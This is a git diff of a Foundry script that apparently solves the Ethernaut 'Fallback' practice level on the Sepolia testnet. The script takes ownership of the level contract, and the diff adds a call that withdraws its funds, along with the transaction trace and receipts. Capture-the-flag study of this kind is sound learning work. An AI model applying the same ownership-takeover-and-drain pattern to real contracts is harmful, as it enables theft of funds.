@@ -34,6 +34,11 @@ import "../src/levels/Fallback.sol";
         [7302] 0xbEdEfE3a6f165002E45c25F2106d1967673b3921::fallback{value: 1}()
             └─ ← [Stop]
 
+        [9300] 0xbEdEfE3a6f165002E45c25F2106d1967673b3921::withdraw()
+            ├─ [0] 0x471Cd8eaA5D60C2ed4dd42CC3B0dE75EcfBBdA62::fallback{value: 2}()
+            │   └─ ← [Stop]
+            └─ ← [Stop]
+
     ==========================
 
     Chain 11155111
@@ -52,14 +57,15 @@ import "../src/levels/Fallback.sol";
     Block: 6672004
     Paid: 0.000212658355706075 ETH (47965 gas * 4.433615255 gwei)
 
-
     ##### sepolia
     ✅  [Success]Hash: 0x83c87e7013625ed88873c5fae98258e6ee3c360262e1e3c4037029995df025f6
     Block: 6672004
     Paid: 0.00012548017894701 ETH (28302 gas * 4.433615255 gwei)
 
-    ✅ Sequence #1 on sepolia | Total Paid: 0.000338138534653085 ETH (76267 gas * avg 4.433615255 gwei)
-
+    ##### sepolia
+    ✅  [Success]Hash: 0x1528408553a1c06e63912bedc22fee8be3d59cb1ffd646660d2261380b1db8e5
+    Block: 6672110
+    Paid: 0.000170876861870612 ETH (30364 gas * 5.627613683 gwei)
 
     ==========================
 
@@ -84,6 +90,9 @@ contract FallbackScript is Test {
 
         // if the player is not the owner then we have failed so revert
         require(level1.owner() == msg.sender, "Owner not updated correctly");
+
+        // don't forget to widthdraw the funds!!
+        level1.withdraw();
 
         vm.stopBroadcast();
     }
